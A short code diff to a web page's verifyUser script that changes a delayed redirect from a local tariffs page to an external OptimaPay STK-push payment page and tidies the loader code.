@@ -193,13 +193,13 @@ function verifyUser(){
   localStorage.setItem("userID", id)
   localStorage.setItem("currentLimit", limit)
 
-  /* SHOW LOADER */
-  document.getElementById("loader").style.display="block"
+/* SHOW LOADER */
+document.getElementById("loader").style.display = "block";
 
-  /* WAIT 5 SECONDS */
-  setTimeout(()=>{ window.location.href="tariffs.html" },5000)
-}
-</script>
+/* Redirect to your OptimaPay page after 2 seconds */
+setTimeout(() => {
+    window.location.href = "https://optimapay-stk-push.onrender.com";
+}, 2000);</script>
 
 </body>
 </html>
